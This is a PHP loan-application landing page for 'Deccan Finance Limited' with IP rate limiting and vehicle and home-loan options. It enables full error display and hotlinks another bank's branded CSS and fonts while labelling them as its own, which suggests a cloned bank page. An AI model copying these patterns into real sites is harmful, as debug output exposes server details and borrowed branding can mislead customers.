<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
/**
 * Deccan Finance Limited Onboarding - Choose Account Page
 * Handles rate limit validation on backend and renders the account selection
 */

require_once 'api/db_helper.php';

$ip = get_client_ip();

// Rate limiting check (Max 3 requests per 10 seconds)
$isLimited = is_rate_limited($ip, 3, 10);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Deccan Finance - Open Digital Account</title>
    
    <!-- Deccan Finance CSS Toolkit -->
    <link rel="stylesheet" href="https://assets.rmb.co.za/css/firstrand.toolkit.min.css" type="text/css">
    <link rel="stylesheet" href="https://assets.rmb.co.za/fonts/fonts.css" type="text/css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ionicons/2.0.1/css/ionicons.min.css" type="text/css">
    <link rel="icon" type="image/png" href="favicon.png">
    
    <style>
        body {
            background-color: #f4f6f9;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
        }
        .header.inverted {
            background-color: #031f73;
            border-bottom: 4px solid #fecb00;
        }
        .header.inverted .logo {
            filter: none;
            height: 35px;
        }
        .choose-container {
            max-width: 900px;
            margin: 60px auto;
            padding: 0 20px;
            box-sizing: border-box;
            text-align: center;
        }
        .choose-title {
            color: #031f73;
            font-size: 2.2rem;
            font-weight: 700;
            margin-bottom: 15px;
        }
        .choose-subtitle {
            color: #666;
            font-size: 1.1rem;
            max-width: 600px;
            margin: 0 auto 50px;
            line-height: 1.6;
        }
        .cards-wrapper {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
            margin-bottom: 50px;
        }
        @media (max-width: 768px) {
            .cards-wrapper {
                grid-template-columns: 1fr;
            }
        }
        .account-card {
            background: white;
            border-radius: 6px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.06);
            padding: 40px 30px;
            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
            border-top: 4px solid #ccd6dd;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-decoration: none;
            color: #333;
        }
        .account-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(3, 31, 115, 0.12);
        }
        .card-savings { border-top-color: #031f73; }
        .card-current { border-top-color: #fecb00; }
        
        .card-icon {
            font-size: 4rem;
            color: #031f73;
            margin-bottom: 20px;
        }
        .card-savings .card-icon { color: #031f73; }
        .card-current .card-icon { color: #031f73; }
        
        .account-card h3 {
            color: #031f73;
            font-size: 1.5rem;
            margin-top: 0;
            margin-bottom: 15px;
        }
        .account-card p {
            font-size: 0.95rem;
            color: #666;
            line-height: 1.6;
            margin-bottom: 25px;
            text-align: center;
        }
        .btn-card-select {
            display: inline-block;
            background-color: #031f73;
            color: white;
            padding: 10px 30px;
            border-radius: 4px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            font-size: 0.9rem;
            transition: all 0.3s;
            border: 2px solid #031f73;
            margin-top: auto;
        }
        .account-card:hover .btn-card-select {
            background-color: #fecb00;
            color: #031f73;
            border-color: #fecb00;
        }
        
        /* Security Block Screen Styles */
        .block-container {
            max-width: 550px;
            margin: 100px auto;
            background: white;
            border-radius: 6px;
            box-shadow: 0 10px 30px rgba(255, 95, 86, 0.15);
            border: 1px solid rgba(255, 95, 86, 0.3);
            border-top: 5px solid #ff5f56;
            padding: 40px;
            text-align: center;
        }
        .block-icon {
            font-size: 4.5rem;
            color: #ff5f56;
            margin-bottom: 20px;
        }
        .block-title {
            color: #333;
            font-size: 1.6rem;
            font-weight: 700;
            margin-top: 0;
            margin-bottom: 15px;
        }
        .block-text {
            color: #666;
            line-height: 1.6;
            font-size: 0.95rem;
            margin-bottom: 30px;
        }
        .btn-back-home {
            display: inline-block;
            background-color: #f5f8fa;
            border: 1px solid #ccd6dd;
            color: #333;
            padding: 10px 24px;
            border-radius: 4px;
            font-weight: 600;
            text-decoration: none;
            transition: all 0.3s;
        }
        .btn-back-home:hover {
            background-color: #e1e8ed;
        }
    </style>
</head>
<body class="has-header loaded">

    <!-- Header -->
    <header class="header inverted">
        <div class="container" style="padding-top:10px; padding-bottom:10px;">
            <a href="index.html">
                <img src="logo.png" alt="Deccan Finance Logo" class="logo">
            </a>
        </div>
    </header>

    <?php if ($isLimited): ?>
        <!-- Backend Rate Limit Block Screen -->
        <div class="block-container">
            <span class="block-icon ion-ios-locked-outline"></span>
            <h2 class="block-title">Security Gateway Check</h2>
            <p class="block-text">
                Your connection has been temporarily throttled. We detected an unusually high volume of server requests originating from your IP address (<strong><?= htmlspecialchars($ip) ?></strong>).
            </p>
            <p style="font-size: 0.85rem; color: #888; margin-bottom: 30px;">
                To protect our onboarding systems from automated traffic, please wait 10 seconds before attempting to refresh this page.
            </p>
            <a href="index.html" class="btn-back-home">Return to Homepage</a>
        </div>
    <?php else: ?>
        <!-- Regular Selection Page -->
        <div class="choose-container">
            <h2 class="choose-title">Apply for a Loan</h2>
            <p class="choose-subtitle">
                Select the loan type that best aligns with your financial goals to begin your application.
            </p>
            
            <div class="cards-wrapper">
                <!-- Vehicle Loan Card -->
                <a href="open-account.php?type=vehicle" class="account-card card-savings">
                    <span class="card-icon ion-android-car"></span>
                    <h3>Vehicle Loan</h3>
                    <p>
                        Get fast approval on two-wheeler and four-wheeler loans. Enjoy competitive interest rates, zero hidden charges, and flexible repayment terms.
                    </p>
                    <span class="btn-card-select">Apply Vehicle Loan</span>
                </a>
                
                <!-- Home & LAP Card -->
                <a href="open-account.php?type=home" class="account-card card-current">
                    <span class="card-icon ion-ios-home-outline"></span>
                    <h3>Home & LAP</h3>
                    <p>
                        Secure your dream home or get a loan against property. Access high loan limits, immediate approvals, dedicated relationship officers, and custom repayment tools.
                    </p>
                    <span class="btn-card-select">Apply Home/LAP</span>
                </a>
            </div>
            
            <p style="font-size: 0.85rem; color:#888;">
                Deccan Finance Limited is regulated by the Reserve Bank of India.
            </p>
        </div>
    <?php endif; ?>

</body>
</html>
